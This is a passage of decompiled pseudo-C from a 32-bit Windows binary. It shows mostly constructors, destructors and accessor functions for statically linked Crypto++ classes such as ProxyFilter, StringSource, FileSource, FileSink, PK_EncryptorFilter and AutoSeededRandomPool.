  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  v1 = (int (__thiscall ***)(_DWORD, int))this[3];
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}

//----- (00406B30) --------------------------------------------------------
void __thiscall sub_406B30(_DWORD *this)
{
  void *v1; // edx
  unsigned int v2; // eax
  unsigned int v3; // ecx

  *this = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v1 = (void *)this[4];
  v2 = this[2];
  v3 = this[3];
  if ( v2 < v3 )
    v3 = v2;
  memset(v1, 0, v3);
  j_j___free_base(v1);
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';

//----- (00406BA0) --------------------------------------------------------
void *__thiscall sub_406BA0(void *this, char a2)
{
  unsigned int v3; // eax
  unsigned int v4; // ecx
  void *v5; // edx

  *(_DWORD *)this = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v3 = *((_DWORD *)this + 2);
  v4 = *((_DWORD *)this + 3);
  v5 = (void *)*((_DWORD *)this + 4);
  if ( v3 < v4 )
    v4 = v3;
  memset(*((void **)this + 4), 0, v4);
  j_j___free_base(v5);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';

//----- (00406C20) --------------------------------------------------------
int __thiscall sub_406C20(_DWORD *this)
{
  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  v1 = (int (__thiscall ***)(_DWORD, int))this[3];
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}

//----- (00406C70) --------------------------------------------------------
void __thiscall sub_406C70(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  void *v3; // [esp-4h] [ebp-24h]

  *this = &CryptoPP::FilterWithBufferedInput::`vftable';
  this[1] = &CryptoPP::FilterWithBufferedInput::`vftable';
  v3 = (void *)this[13];
  memset(v3, 0, *(_DWORD *)((char *)this + (this[11] < this[12] ? 4 : 8) + 40));
  j_j___free_base(v3);
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
    (**v2)(v2, 1);
}
// 4BB524: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 4BB61C: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';

//----- (00406D10) --------------------------------------------------------
int __thiscall sub_406D10(int *this, char *a2, int a3, int a4, int a5)
{
  return sub_454A10(this, a2, a3, a4, a5, 0);
}

//----- (00406D30) --------------------------------------------------------
int __thiscall sub_406D30(int *this, char *a2, int a3, int a4, int a5)
{
  return sub_454A10(this, a2, a3, a4, a5, 1);
}

//----- (00406D50) --------------------------------------------------------
char __thiscall sub_406D50(_BYTE *this)
{
  return this[36];
}

//----- (00406D60) --------------------------------------------------------
int __thiscall sub_406D60(_DWORD *this)
{
  return this[6];
}

//----- (00406D70) --------------------------------------------------------
int __thiscall sub_406D70(_DWORD *this)
{
  return this[7];
}

//----- (00406D80) --------------------------------------------------------
int __thiscall sub_406D80(_DWORD *this)
{
  return this[8];
}

//----- (00406D90) --------------------------------------------------------
int __thiscall sub_406D90(void *this, int a2, int a3, int a4, int a5)
{
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 212))(this, a2);
}

//----- (00406DB0) --------------------------------------------------------
int __thiscall sub_406DB0(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 224))(this);
}

//----- (00406DD0) --------------------------------------------------------
int __stdcall sub_406DD0(int a1, int a2)
{
  return 0;
}

//----- (00406DE0) --------------------------------------------------------
_DWORD *__thiscall sub_406DE0(_DWORD *this, char a2)
{
  sub_406C70(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00406E10) --------------------------------------------------------
void __thiscall sub_406E10(_DWORD *this)
{
  void *v1; // edx
  unsigned int v2; // eax
  unsigned int v3; // ecx

  v1 = (void *)this[3];
  v2 = this[1];
  v3 = this[2];
  if ( v2 < v3 )
    v3 = v2;
  memset(v1, 0, v3);
  j_j___free_base(v1);
}

//----- (00406E70) --------------------------------------------------------
void __thiscall sub_406E70(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &CryptoPP::ProxyFilter::`vftable';
  this[1] = &CryptoPP::ProxyFilter::`vftable';
  v2 = (void (__thiscall ***)(_DWORD, int))this[18];
  if ( v2 )
    (**v2)(v2, 1);
  sub_406C70(this);
}
// 4BB914: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4BBA0C: using guessed type void *CryptoPP::ProxyFilter::`vftable';

//----- (00406EE0) --------------------------------------------------------
_DWORD *__thiscall sub_406EE0(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx

  *this = &CryptoPP::ProxyFilter::`vftable';
  this[1] = &CryptoPP::ProxyFilter::`vftable';
  v3 = (void (__thiscall ***)(_DWORD, int))this[18];
  if ( v3 )
    (**v3)(v3, 1);
  sub_406C70(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BB914: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4BBA0C: using guessed type void *CryptoPP::ProxyFilter::`vftable';

//----- (00406F60) --------------------------------------------------------
int __thiscall sub_406F60(_DWORD **this, int a2, int a3)
{
  return (*(int (__thiscall **)(_DWORD *, _DWORD, _DWORD, int, int))(*this[18] + 24))(this[18], 0, 0, -1, 1);
}

//----- (00406F80) --------------------------------------------------------
_DWORD *__thiscall sub_406F80(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx

  *this = &CryptoPP::ProxyFilter::`vftable';
  this[1] = &CryptoPP::ProxyFilter::`vftable';
  v3 = (void (__thiscall ***)(_DWORD, int))this[18];
  if ( v3 )
    (**v3)(v3, 1);
  sub_406C70(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BB914: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4BBA0C: using guessed type void *CryptoPP::ProxyFilter::`vftable';

//----- (00407010) --------------------------------------------------------
void __thiscall sub_407010(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &CryptoPP::ProxyFilter::`vftable';
  this[1] = &CryptoPP::ProxyFilter::`vftable';
  v2 = (void (__thiscall ***)(_DWORD, int))this[18];
  if ( v2 )
    (**v2)(v2, 1);
  sub_406C70(this);
}
// 4BB914: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4BBA0C: using guessed type void *CryptoPP::ProxyFilter::`vftable';

//----- (00407080) --------------------------------------------------------
_DWORD *__thiscall sub_407080(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax

  v5 = (*(int (__thiscall **)(int, int, _DWORD, void ***))(*(_DWORD *)a3 + 28))(a3, a2, 0, off_4E8018[0]);
  sub_452D00(this, v5, 0, 0, a4);
  *this = &CryptoPP::SimpleProxyFilter::`vftable';
  this[1] = &CryptoPP::SimpleProxyFilter::`vftable';
  *this = &CryptoPP::PK_EncryptorFilter::`vftable';
  this[1] = &CryptoPP::PK_EncryptorFilter::`vftable';
  return this;
}
// 4CF2E0: using guessed type void *CryptoPP::SimpleProxyFilter::`vftable';
// 4CF79C: using guessed type void *CryptoPP::PK_EncryptorFilter::`vftable';
// 4CFA7C: using guessed type void *CryptoPP::SimpleProxyFilter::`vftable';
// 4CFB20: using guessed type void *CryptoPP::PK_EncryptorFilter::`vftable';
// 4E8018: using guessed type void ***off_4E8018[3];

//----- (00407110) --------------------------------------------------------
_DWORD *__thiscall sub_407110(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx

  *this = &CryptoPP::ProxyFilter::`vftable';
  this[1] = &CryptoPP::ProxyFilter::`vftable';
  v3 = (void (__thiscall ***)(_DWORD, int))this[18];
  if ( v3 )
    (**v3)(v3, 1);
  sub_406C70(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BB914: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4BBA0C: using guessed type void *CryptoPP::ProxyFilter::`vftable';

//----- (004071A0) --------------------------------------------------------
void *__thiscall sub_4071A0(void *this, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (004071C0) --------------------------------------------------------
void __thiscall sub_4071C0(_DWORD *this)
{
  void *v1; // edx
  unsigned int v2; // eax
  unsigned int v3; // ecx

  v1 = (void *)this[6];
  v2 = this[4];
  v3 = this[5];
  if ( v2 < v3 )
    v3 = v2;
  memset(v1, 0, v3);
  j_j___free_base(v1);
}

//----- (00407220) --------------------------------------------------------
int __thiscall sub_407220(_DWORD *this)
{
  int (__thiscall ***v2)(_DWORD, int); // ecx
  int result; // eax

  v2 = (int (__thiscall ***)(_DWORD, int))this[1];
  if ( v2 )
    result = (**v2)(v2, 1);
  *this = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00407280) --------------------------------------------------------
int __thiscall sub_407280(_DWORD *this)
{
  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  v1 = (int (__thiscall ***)(_DWORD, int))this[3];
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}

//----- (004072D0) --------------------------------------------------------
_DWORD *__thiscall sub_4072D0(_DWORD *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  void *v7; // edx
  _DWORD *v8; // eax
  int v9; // ecx
  _DWORD *v10; // eax
  unsigned int v11; // ecx
  void *v12; // edx
  void **v14; // [esp+1Ch] [ebp-38h] BYREF
  void (__thiscall ***v15)(_DWORD, int); // [esp+20h] [ebp-34h]
  _DWORD *v16; // [esp+28h] [ebp-2Ch]
  char v17[4]; // [esp+2Ch] [ebp-28h] BYREF
  _DWORD *v18; // [esp+30h] [ebp-24h]
  int v19; // [esp+34h] [ebp-20h]
  unsigned int v20; // [esp+3Ch] [ebp-18h]
  unsigned int v21; // [esp+40h] [ebp-14h]
  void *Block; // [esp+44h] [ebp-10h]
  int v23; // [esp+50h] [ebp-4h]

  v16 = a2;
  sub_452860(this, 0);
  sub_4535B0(this, a4);
  v23 = 2;
  *this = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  this[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  sub_435E90(this + 6, 0);
  this[9] = -1;
  *((_BYTE *)this + 40) = 0;
  this[6] = &CryptoPP::StringStore::`vftable';
  this[7] = &CryptoPP::StringStore::`vftable';
  v20 = -1;
  v21 = 0;
  Block = 0;
  v18 = 0;
  v19 = 0;
  v17[0] = 0;
  LOBYTE(v23) = 7;
  v5 = sub_422210(&v14, (int)"InputBuffer", (int)v17, 1);
  LOBYTE(v23) = 8;
  sub_454EC0(this + 6, (int)v5);
  LOBYTE(v23) = 9;
  if ( v15 )
    (**v15)(v15, 1);
  v14 = &CryptoPP::NameValuePairs::`vftable';
  LOBYTE(v23) = 2;
  v6 = v21;
  v7 = Block;
  if ( v20 < v21 )
    v6 = v20;
  memset(Block, 0, v6);
  j_j___free_base(v7);
  v23 = 12;
  *this = &CryptoPP::StringSource::`vftable';
  this[1] = &CryptoPP::StringSource::`vftable';
  v17[0] = 0;
  v18 = 0;
  v19 = 0;
  v20 = -1;
  v21 = 0;
  Block = 0;
  LOBYTE(v23) = 14;
  v8 = v16;
  v9 = v16[4];
  if ( v16[5] >= 0x10u )
    v8 = (_DWORD *)*v16;
  v18 = v8;
  v19 = v9;
  v17[0] = 0;
  LOBYTE(v23) = 17;
  v10 = sub_422210(&v14, (int)"InputBuffer", (int)v17, 1);
  LOBYTE(v23) = 18;
  (*(void (__thiscall **)(_DWORD *, _DWORD *))(*this + 32))(this, v10);
  (*(void (__thiscall **)(_DWORD *, int))(*this + 200))(this, 1);
  LOBYTE(v23) = 19;
  if ( v15 )
    (**v15)(v15, 1);
  v14 = &CryptoPP::NameValuePairs::`vftable';
  LOBYTE(v23) = 12;
  v11 = v21;
  v12 = Block;
  if ( v20 < v21 )
    v11 = v20;
  memset(Block, 0, v11);
  j_j___free_base(v12);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA64C: using guessed type void *CryptoPP::StringStore::`vftable';
// 4BA708: using guessed type void *CryptoPP::StringStore::`vftable';
// 4BA718: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4BA7EC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4BA7FC: using guessed type void *CryptoPP::StringSource::`vftable';
// 4BA8D0: using guessed type void *CryptoPP::StringSource::`vftable';
// 4072D0: using guessed type char var_28[4];

//----- (004074E0) --------------------------------------------------------
_DWORD *__thiscall sub_4074E0(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx

  *this = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  this[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  v3 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v3 )
    (**v3)(v3, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BA718: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4BA7EC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';

//----- (00407560) --------------------------------------------------------
int __thiscall sub_407560(_DWORD *this)
{
  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  *this = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  this[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  v1 = (int (__thiscall ***)(_DWORD, int))this[3];
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}
// 4BA718: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4BA7EC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';

//----- (004075C0) --------------------------------------------------------
char __thiscall sub_4075C0(_DWORD *this)
{
  *this = &CryptoPP::AutoSeededRandomPool::`vftable';
  return sub_4076F0((int)this);
}
// 4CFA9C: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';

//----- (00407610) --------------------------------------------------------
_DWORD *__thiscall sub_407610(_DWORD *this, int a2, int a3)
{
  sub_462070(this);
  *this = &CryptoPP::AutoSeededRandomPool::`vftable';
  sub_457740(this, 0, 0x20u);
  return this;
}
// 4CFA9C: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';

//----- (00407680) --------------------------------------------------------
_DWORD *__thiscall sub_407680(_DWORD *this, char a2)
{
  *this = &CryptoPP::AutoSeededRandomPool::`vftable';
  sub_4076F0((int)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4CFA9C: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';

//----- (004076F0) --------------------------------------------------------
char __thiscall sub_4076F0(int this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  unsigned int *v3; // edx
  void *v4; // edi
  unsigned int v5; // ecx
  int v6; // edx
  void *v7; // edi
  int v8; // eax
  unsigned int v9; // esi
  unsigned int v10; // ecx
  void *v11; // eax

  v2 = *(void (__thiscall ****)(_DWORD, int))(this + 120);
  if ( v2 )
    (**v2)(v2, 1);
  v3 = (unsigned int *)(this + 108);
  v4 = *(void **)(this + 112);
  if ( *(_DWORD *)(this + 104) < *(_DWORD *)(this + 108) )
    v3 = (unsigned int *)(this + 104);
  v5 = *v3;
  if ( v4 == (void *)(this + 56 + (-(this + 56) & 0xF)) )
  {
    *(_BYTE *)(this + 97) = 0;
    memset(v4, 0, v5);
  }
  v6 = this + 8;
  v7 = *(void **)(this + 48);
  v8 = -(this + 8);
  v9 = *(_DWORD *)(this + 40);
  v10 = *(_DWORD *)(v6 + 36);
  v11 = (void *)(v6 + (v8 & 0xF));
  if ( v7 == v11 )
  {
    *(_BYTE *)(v6 + 25) = 0;
    if ( v9 < v10 )
      v10 = v9;
    LOBYTE(v11) = 0;
    memset(v7, 0, v10);
  }
  return (char)v11;
}

//----- (004077B0) --------------------------------------------------------
char __fastcall sub_4077B0(int a1)
{
  void *v1; // edi
  unsigned int v2; // esi
  unsigned int v3; // edx
  void *v4; // eax

  v1 = *(void **)(a1 + 40);
  v2 = *(_DWORD *)(a1 + 32);
  v3 = *(_DWORD *)(a1 + 36);
  v4 = (void *)(a1 + (-a1 & 0xF));
  if ( v1 == v4 )
  {
    *(_BYTE *)(a1 + 25) = 0;
    if ( v2 < v3 )
      v3 = v2;
    LOBYTE(v4) = 0;
    memset(v1, 0, v3);
  }
  return (char)v4;
}

//----- (00407820) --------------------------------------------------------
char __fastcall sub_407820(int a1)
{
  void *v1; // edi
  unsigned int v2; // esi
  unsigned int v3; // edx
  void *v4; // eax

  v1 = *(void **)(a1 + 56);
  v2 = *(_DWORD *)(a1 + 48);
  v3 = *(_DWORD *)(a1 + 52);
  v4 = (void *)(a1 + (-a1 & 0xF));
  if ( v1 == v4 )
  {
    *(_BYTE *)(a1 + 41) = 0;
    if ( v2 < v3 )
      v3 = v2;
    LOBYTE(v4) = 0;
    memset(v1, 0, v3);
  }
  return (char)v4;
}

//----- (00407890) --------------------------------------------------------
char __fastcall sub_407890(int a1)
{
  void *v1; // edi
  unsigned int v2; // esi
  unsigned int v3; // edx
  void *v4; // eax

  v1 = *(void **)(a1 + 40);
  v2 = *(_DWORD *)(a1 + 32);
  v3 = *(_DWORD *)(a1 + 36);
  v4 = (void *)(a1 + (-a1 & 0xF));
  if ( v1 == v4 )
  {
    *(_BYTE *)(a1 + 25) = 0;
    if ( v2 < v3 )
      v3 = v2;
    LOBYTE(v4) = 0;
    memset(v1, 0, v3);
  }
  return (char)v4;
}

//----- (00407900) --------------------------------------------------------
char __fastcall sub_407900(int a1)
{
  void *v1; // edi
  unsigned int v2; // esi
  unsigned int v3; // edx
  void *v4; // eax

  v1 = *(void **)(a1 + 56);
  v2 = *(_DWORD *)(a1 + 48);
  v3 = *(_DWORD *)(a1 + 52);
  v4 = (void *)(a1 + (-a1 & 0xF));
  if ( v1 == v4 )
  {
    *(_BYTE *)(a1 + 41) = 0;
    if ( v2 < v3 )
      v3 = v2;
    LOBYTE(v4) = 0;
    memset(v1, 0, v3);
  }
  return (char)v4;
}

//----- (00407970) --------------------------------------------------------
int __thiscall sub_407970(int this, char a2)
{
  int v3; // ecx
  unsigned int v4; // ecx
  void *v6; // [esp-4h] [ebp-20h]

  v3 = *(_DWORD *)(this + 44);
  if ( v3 )
    (**(void (__thiscall ***)(int, int))(*(_DWORD *)(*(_DWORD *)v3 + 4) + v3))(*(_DWORD *)(*(_DWORD *)v3 + 4) + v3, 1);
  *(_DWORD *)(this + 20) = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v4 = *(_DWORD *)(this + 32);
  v6 = *(void **)(this + 36);
  if ( *(_DWORD *)(this + 28) < v4 )
    v4 = *(_DWORD *)(this + 28);
  memset(*(void **)(this + 36), 0, v4);
  j_j___free_base(v6);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';

//----- (00407A20) --------------------------------------------------------
void __thiscall sub_407A20(int this)
{
  int v2; // ecx
  unsigned int v3; // ecx
  void *v4; // [esp-4h] [ebp-20h]

  v2 = *(_DWORD *)(this + 44);
  if ( v2 )
    (**(void (__thiscall ***)(int, int))(*(_DWORD *)(*(_DWORD *)v2 + 4) + v2))(*(_DWORD *)(*(_DWORD *)v2 + 4) + v2, 1);
  *(_DWORD *)(this + 20) = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v3 = *(_DWORD *)(this + 32);
  v4 = *(void **)(this + 36);
  if ( *(_DWORD *)(this + 28) < v3 )
    v3 = *(_DWORD *)(this + 28);
  memset(*(void **)(this + 36), 0, v3);
  j_j___free_base(v4);
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';

//----- (00407AB0) --------------------------------------------------------
_DWORD *__thiscall sub_407AB0(_DWORD *this, int a2, int a3, int a4, int a5)
{
  _DWORD *v6; // eax
  int v7; // eax
  int v9; // [esp+Ch] [ebp-2Ch] BYREF
  void (__thiscall ***v10)(_DWORD, int); // [esp+10h] [ebp-28h]
  _DWORD *v11; // [esp+18h] [ebp-20h]
  _DWORD *v12; // [esp+1Ch] [ebp-1Ch]
  int v13; // [esp+20h] [ebp-18h] BYREF
  char v14[4]; // [esp+24h] [ebp-14h] BYREF
  int v15; // [esp+34h] [ebp-4h]

  v12 = this;
  v11 = this;
  v13 = a2;
  v14[0] = 1;
  sub_4180C0((int)this, a4);
  v15 = 0;
  *this = &CryptoPP::FileSource::`vftable';
  this[1] = &CryptoPP::FileSource::`vftable';
  v6 = sub_422600(&v9, (int)"InputFileNameWide", &v13);
  LOBYTE(v15) = 1;
  v7 = sub_426840((int)v6, (int)"InputBinaryMode", v14, *((_BYTE *)v6 + 8));
  (*(void (__thiscall **)(_DWORD *, int))(*this + 32))(this, v7);
  (*(void (__thiscall **)(_DWORD *, int))(*this + 200))(this, 1);
  LOBYTE(v15) = 2;
  if ( v10 )
    (**v10)(v10, 1);
  return this;
}
// 4CF4D0: using guessed type void *CryptoPP::FileSource::`vftable';
// 4CF8CC: using guessed type void *CryptoPP::FileSource::`vftable';
// 407AB0: using guessed type char var_14[4];

//----- (00407B90) --------------------------------------------------------
_DWORD *__thiscall sub_407B90(_DWORD *this, char a2)
{
  sub_4181B0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00407BF0) --------------------------------------------------------
void __thiscall sub_407BF0(_DWORD *this)
{
  sub_4181B0(this);
}

//----- (00407C40) --------------------------------------------------------
_DWORD *__thiscall sub_407C40(_DWORD *this, int a2, int a3)
{
  _DWORD *v4; // eax
  int v5; // eax
  int v7; // [esp+8h] [ebp-2Ch] BYREF
  void (__thiscall ***v8)(_DWORD, int); // [esp+Ch] [ebp-28h]
  _DWORD *v9; // [esp+14h] [ebp-20h]
  _DWORD *v10; // [esp+18h] [ebp-1Ch]
  int v11; // [esp+1Ch] [ebp-18h] BYREF
  char v12[4]; // [esp+20h] [ebp-14h] BYREF
  int v13; // [esp+30h] [ebp-4h]

  v10 = this;
  v9 = this;
  v11 = a2;
  v12[0] = 1;
  sub_435E90(this, 0);
  *this = &CryptoPP::FileSink::`vftable';
  this[1] = &CryptoPP::FileSink::`vftable';
  this[3] = 0;
  v13 = 0;
  v4 = sub_422600(&v7, (int)"OutputFileNameWide", &v11);
  LOBYTE(v13) = 1;
  v5 = sub_426840((int)v4, (int)"OutputBinaryMode", v12, *((_BYTE *)v4 + 8));
  sub_455DE0(this, v5);
  LOBYTE(v13) = 2;
  if ( v8 )
    (**v8)(v8, 1);
  return this;
}
// 4CD3FC: using guessed type void *CryptoPP::FileSink::`vftable';
// 4CF684: using guessed type void *CryptoPP::FileSink::`vftable';
// 407C40: using guessed type char var_14[4];

//----- (00407D20) --------------------------------------------------------
_DWORD *__thiscall sub_407D20(_DWORD *this, char a2)
{
  int v3; // ecx

  v3 = this[3];
  if ( v3 )
    (**(void (__thiscall ***)(int, int))(*(_DWORD *)(*(_DWORD *)v3 + 4) + v3))(*(_DWORD *)(*(_DWORD *)v3 + 4) + v3, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00407D90) --------------------------------------------------------
int __thiscall sub_407D90(_DWORD *this)
{
  int v1; // ecx
  int result; // eax

  v1 = this[3];
  if ( v1 )
    return (**(int (__thiscall ***)(int, int))(*(_DWORD *)(*(_DWORD *)v1 + 4) + v1))(
             *(_DWORD *)(*(_DWORD *)v1 + 4) + v1,
             1);
  return result;
}

//----- (00407DE0) --------------------------------------------------------
int __thiscall sub_407DE0(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 8))(this);
}

//----- (00407DF0) --------------------------------------------------------
int __thiscall sub_407DF0(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 4))(this[2]);
}

//----- (00407E00) --------------------------------------------------------
int __thiscall sub_407E00(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 8))(this[2]);
}

//----- (00407E10) --------------------------------------------------------
int __thiscall sub_407E10(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 12))(this[2]);
}

//----- (00407E20) --------------------------------------------------------
int __thiscall sub_407E20(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 16))(this[2]);
}

//----- (00407E30) --------------------------------------------------------
int __thiscall sub_407E30(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 20))(this[2]);
}

//----- (00407E40) --------------------------------------------------------
int __thiscall sub_407E40(_DWORD *this)
{
  return this[5];
}

//----- (00407E50) --------------------------------------------------------
int __thiscall sub_407E50(_DWORD *this, int a2)
{
  int result; // eax
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v4[9]; // [esp+2Ch] [ebp-24h] BYREF

  result = a2;
  if ( a2 )
  {
    if ( a2 != this[5] )
    {
      sub_419B80((int)v4, "CipherModeBase: feedback size cannot be specified for this cipher mode");
      v4[8] = 0;
      sub_405230(pExceptionObject, v4);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
  }
  return result;
}

//----- (00407ED0) --------------------------------------------------------
void __thiscall sub_407ED0(int this)
{
  unsigned int v2; // ecx
  void *v3; // edx
  void *v4; // [esp-4h] [ebp-20h]

  v4 = *(void **)(this + 44);
  memset(v4, 0, *(_DWORD *)(this + 32 + (*(_DWORD *)(this + 36) < *(_DWORD *)(this + 40) ? 4 : 8)));
  j_j___free_base(v4);
  v2 = *(_DWORD *)(this + 20);
  v3 = *(void **)(this + 24);
  if ( *(_DWORD *)(this + 16) < v2 )
    v2 = *(_DWORD *)(this + 16);
  memset(*(void **)(this + 24), 0, v2);
  j_j___free_base(v3);
}

//----- (00407F60) --------------------------------------------------------
int __thiscall sub_407F60(_DWORD *this)
{
  return (*(int (__thiscall **)(int))(*(_DWORD *)(*(this - 5) + 4) + 24))(*(this - 5) + 4);
}

//----- (00407F70) --------------------------------------------------------
int __thiscall sub_407F70(_DWORD *this)
{
  return *(this - 2);
}

//----- (00407F80) --------------------------------------------------------
int __thiscall sub_407F80(_DWORD *this)
{
  return (*(int (__thiscall **)(int))(*(_DWORD *)(*(this - 5) + 4) + 36))(*(this - 5) + 4);
}

//----- (00407F90) --------------------------------------------------------
int __thiscall sub_407F90(void *this, int a2, int a3)
{
  return (*(int (__thiscall **)(void *, int, int, _DWORD, int))(*(_DWORD *)this + 28))(this, 4, a2, 0, a3);
}

//----- (00407FB0) --------------------------------------------------------
void __thiscall sub_407FB0(_DWORD *this)
{
  void *v1; // edx
  unsigned int v2; // eax
  unsigned int v3; // ecx

  v1 = (void *)this[6];
  v2 = this[4];
  v3 = this[5];
  if ( v2 < v3 )
    v3 = v2;
  memset(v1, 0, v3);
  j_j___free_base(v1);
}

//----- (00408010) --------------------------------------------------------
_DWORD *__thiscall sub_408010(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  void *v5; // [esp-4h] [ebp-20h]

  v5 = (void *)this[15];
  memset(v5, 0, *(_DWORD *)((char *)this + (this[13] < this[14] ? 0xFFFFFFFC : 0) + 56));
  j_j___free_base(v5);
  v3 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v3 )
    (**v3)(v3, 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (004080A0) --------------------------------------------------------
_DWORD *__userpurge sub_4080A0@<eax>(_DWORD *a1@<ecx>, int a2@<ebp>, int a3, int a4, int a5)
{
  int v6; // esi
  _DWORD *v7; // esi
  int v8; // eax
  void (__thiscall ***v9)(_DWORD, int); // ecx
  void (__thiscall ***v10)(_DWORD, int); // ecx
  _DWORD *v11; // esi
  void *v12; // eax
  int v14; // [esp-40h] [ebp-4Ch] BYREF
  void (__thiscall ***v15)(_DWORD, int); // [esp-3Ch] [ebp-48h]
  void **v16; // [esp-34h] [ebp-40h] BYREF
  void (__thiscall ***v17)(_DWORD, int); // [esp-30h] [ebp-3Ch]
  _DWORD *v18; // [esp-28h] [ebp-34h]
  _DWORD *v19; // [esp-24h] [ebp-30h]
  int v20; // [esp-20h] [ebp-2Ch]
  _DWORD *v21; // [esp-1Ch] [ebp-28h]
  _DWORD *v22; // [esp-18h] [ebp-24h]
  int *v23; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v25; // [esp-8h] [ebp-14h]
  int v26; // [esp-4h] [ebp-10h]
  int v27; // [esp+0h] [ebp-Ch]
  int v28; // [esp+4h] [ebp-8h]
  int v29; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v27 = a2;
  v28 = retaddr;
  v26 = -1;
  v25 = &loc_4ACA66;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v23 = &v29;
  v19 = a1;
  v6 = a5;
  v18 = a1;
  v20 = 0;
  sub_452860(a1, 0);
  v26 = 1;
  *a1 = &CryptoPP::BaseN_Decoder::`vftable';
  a1[1] = &CryptoPP::BaseN_Decoder::`vftable';
  a1[6] = 0;
  a1[7] = 0;
  a1[8] = 0;
  a1[9] = 0;
